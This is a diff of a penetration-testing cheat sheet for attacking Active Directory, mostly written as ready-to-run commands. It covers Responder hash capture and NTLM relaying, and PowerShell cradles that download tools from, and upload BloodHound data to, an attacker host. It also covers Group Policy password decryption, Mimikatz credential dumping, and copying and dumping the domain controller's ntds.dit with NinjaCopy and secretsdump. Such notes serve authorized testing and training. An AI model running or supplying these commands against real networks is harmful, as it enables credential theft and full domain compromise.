@@ -4,7 +4,7 @@ Active Directory
 # Responder
 
 Use Responder to poison LLMNR/NBT-NS requests and capture NTLM/NTLNv2 hashes. This happens when you
-  try to identify a host and DNS fails.
+    try to identify a host and DNS fails.
 
 responder -A -I eth0
 responder -I eth0 -wrd
@@ -19,7 +19,7 @@ ntlmrelayx.py
 - Host discovery and enumeration
 netdiscover -i eth0 -r <CIDR>
 nmap -Pn -n -T4 --open -p- -sC -sV -iL targets.txt
-   Or use Discover which combines nmap, nmap scripts and Metasploit auxiliary modules.
+    Or use Discover which combines nmap, nmap scripts and Metasploit auxiliary modules.
 ------------------------------------------------------------------------------------------------------
 
 # BloodHound
@@ -39,23 +39,42 @@ cd /opt/BloodHound-v3/Ingestors/
 python -m SimpleHTTPServer
 
 - Windows
-C:\> mkdir temp
-C:\> cd temp
-C:\temp> powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://<attacker IP>:8000/SharpHound.exe', 'C:\temp\SharpHound.exe')"
+cd to a discrete, writable directory (C:\Users\<user>\Desktop)
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.0.6:8000/SharpHound.exe', 'SharpHound.exe')"
 
-SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
-SharpHound.exe -c Session                         On subseqequent runs just collect session data
+SharpHound.exe -c LoggedOn                 Run the following as a user that has admin rights
+SharpHound.exe -c Session                  On subseqequent runs just collect session data
 
 This will generate a zip file
 
-d/l the zip file to Kali
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://<attacker IP>/sharp.zip',"<PostDATA>")"
+Upload the zip file to Kali
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.0.6/sharp.zip',"<PostDATA>")"
 
 Open the BloodHound UI
 Drag and drop the zip file into the UI
 ------------------------------------------------------------------------------------------------------
 
-# Domain controller
+# PowerView
+
+See discover/notes/PowerShell/PowerView.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# ADACLScanner
+
+cd to a discrete, writable directory (C:\Users\<user>\Desktop)
+powershell.exe -nop -exec bypass
+iex (new-object net.webclient).downloadfile('http://<target IP>/ADACLScan.ps1', 'ADACLScan.ps1')
+
+.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM"
+
+    or (default is CSV output)
+
+.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML
+
+File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Domain Controller (DC)
 
 nbtstat -a <target IP>
 
@@ -76,45 +95,32 @@ impacket-secretsdump -system SYSTEM -ntds NTDS.DIT LOCAL
 impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# PowerView
+# Extract passwords from Group Policy
 
-cd to a discrete, writable directory (c:\users\<user>\appdata\local).
+powershell.exe -nop -exec bypass
+Import-Module PowerSploit.ps1
+Get-GPPPassword
 
-iex (new-object net.webclient).downloadstring('http://<attacker IP>/PowerView.ps1')
-
-Invoke-ACLScanner | Export-PowerViewCSV acls.csv
+\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
+Search xml files for cpassword.
+GetDecryptedCpassword 'AES 256-bit encrypted password'
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# ADACLScanner
-
-cd to a discrete, writable directory (c:\users\<user>\appdata\local).
-
-iex (new-object net.webclient).downloadfile('http://<target IP>/ADACLScan.ps1', 'ADACLScan.ps1')
-
-.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM"
-
-	or (default is CSV output)
-
-.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML
-
-File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Show Domain Controllers (DC)
+# Show DCs
 dsquery server
 get-netdomaincontroller
 net group “domain controllers” /domain
-net view \\<server>			     DCs contain SYSVOL and NETLOGON shares
-cmd.exe /c set				     LOGONSERVER variable
+net view \\<server>                        DCs contain SYSVOL and NETLOGON shares
+cmd.exe /c set                             LOGONSERVER variable
 
 # Show DC in a specific domain
 dsquery server -domain <something.int>
 get-netdomaincontroller -domain <something.int>
 nslookup <something.int>	Internally, this will likely return DCs that are DNS servers
-nslookup 					     pseudo-shell
-	set type=all
-	_ldap._tcp.<something.int>
-nbtstat -a					Look for the attribute 1C
+nslookup                                   pseudo-shell
+    set type=all
+    _ldap._tcp.<something.int>
+nbtstat -a                                 Look for the attribute 1C
 
 # Show DCs forest-wide
 dsquery server -forest
@@ -189,7 +195,7 @@ dsquery * “ou=something,dc=domain,dc=int” -filter objectclass=user
 # Show child OUs under parent OU
 dsquery * “ou=something,dc=domain,dc=int” -filter objectcategory=organizationalunit) -attr name
 ------------------------------------------------------------------------------------------------------------------------------------------------------
- 
+
 # Show All Group Policy Objects (GPO) data
 dsquery * -filter “(objectclass=grouppolicycontainer)” -attr *
 get-netgpo
@@ -216,4 +222,22 @@ dsquery * “cn=subnets,cn=sites,cn=configuration,dc=<something>,dc=<int>” -at
 
 # Show Active Directory Partitions
 dsquery partition
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Dump the DC database
+
+powershell.exe -nop -exec bypass
+Import-Module PowerView
+Invoke-UserHunter
+Import-Module PowerSploit
+Invoke-Mimikatz -ComputerName <name>
+
+Open a new PS window as Administrator
+Use the creds you just found
+
+Import-Module PowerView
+Get-NetDomainController
+Import-Module PowerSploit
+Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
+ls
 
